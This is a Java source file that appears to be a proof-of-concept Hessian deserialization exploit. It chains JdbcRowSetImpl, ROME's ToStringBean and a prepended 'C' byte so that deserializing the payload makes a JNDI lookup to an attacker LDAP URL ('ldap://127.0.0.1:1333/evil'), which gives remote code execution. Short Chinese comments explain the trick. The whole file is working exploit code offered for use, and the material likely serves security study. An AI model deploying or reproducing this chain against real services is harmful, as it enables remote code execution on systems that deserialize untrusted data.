package com.example;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Vector;


public class expectChain {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://127.0.0.1:1333/evil";
        jdbcRowSet.setDataSourceName(url);

        Vector<String> strMatchColumns = new Vector<>();
        strMatchColumns.add("username");
        Utils.SetValue(jdbcRowSet,"strMatchColumns" ,strMatchColumns);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);  // 只留下toString利用点

        byte[] payload = ser_byte(toStringBean);
        byte[] re_payload = new byte[payload.length + 1];
        System.arraycopy(new byte[]{67}, 0, re_payload, 0, 1);  // 第一个byte为67
        System.arraycopy(payload, 0, re_payload, 1, payload.length);    // 后面的内容是正常payload

        unser(re_payload);
    }

    public static byte[] ser_byte(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        hessian2Output.writeObject(o);
        hessian2Output.flush();
        return baos.toByteArray();
    }

    public static Object unser(byte[] bytes) throws Exception{
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        Object obj = hessian2Input.readObject();
        return obj;
    }
}
